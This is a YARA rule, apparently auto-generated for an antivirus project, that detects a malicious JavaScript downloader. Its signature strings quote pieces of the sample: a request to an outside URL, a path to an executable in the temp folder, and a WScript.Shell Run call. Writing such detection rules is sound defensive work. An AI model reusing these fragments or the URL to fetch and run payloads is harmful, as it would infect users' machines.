rule sig_20160329_db5113997597019abd20a712c17d529d {
  meta:
    description = "datamaliciousorder - file 20160329_db5113997597019abd20a712c17d529d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a70a4f1af330a2e96079ac02f41a0bb4f4b724920459d62126795e5fbbc1dc9f"

  strings:
    $s1  = "function Nvipmorjqp() {return Svrqfhcvr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"4cE9GLxFdFA.exe\";};" fullword ascii
    $s2  = "Wjwohnq[Jtpmvjo](\"GET\", \"http://rvstuintafel.com/aqp9ik\", false);" fullword ascii
    $s3  = "do {WScript[Rvfisdnuni](Mzdmrlzmso() * 11)} while (Wjwohnq[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Ewbfpea(Iockuja, Glzxtgs){return Iockuja - Glzxtgs;};" fullword ascii
    $s5  = "var Svrqfhcvr = function Xqrrqcwbxm() {return WScript[Xkjtbbbgpv](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vbvmbvejk(Haffxaxk){Svrqfhcvr[\"Run\"](Haffxaxk, Tlzilvkyl, Tlzilvkyl);};" fullword ascii
    $s7  = "function Tohbwnzbpq() {return ((Fxypbf == true) && (Fxypbf == Dswqvk)) ? 1 : Tlzilvkyl;};" fullword ascii
    $s8  = "function Edckvvkqdt()" fullword ascii
    $s9  = "function Zwjjoi(Yhwwdbvvm) {var Tfbmq = (1, 2, 3, 4, 5, Yhwwdbvvm); return Tfbmq;};" fullword ascii
    $s10 = "Dswqvk = true; " fullword ascii
    $s11 = " while (Hatjaas){" fullword ascii
    $s12 = "var Dswqvk = false;" fullword ascii
    $s13 = "return Ewbfpea(Mnrgmqjph, Phnsl);" fullword ascii
    $s14 = "var Lzgfz = new this[\"Date\"]();" fullword ascii
    $s15 = "function Mzdmrlzmso(){return 22;};" fullword ascii
    $s16 = "function Xmfplkyah(){return Upflrz;};" fullword ascii
    $s17 = "function Gitisi(){return Xkjtbbbgpv;};" fullword ascii
    $s18 = "var Fxypbf = false;" fullword ascii
    $s19 = "Fxypbf = true; " fullword ascii
    $s20 = "var Kdbnap = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}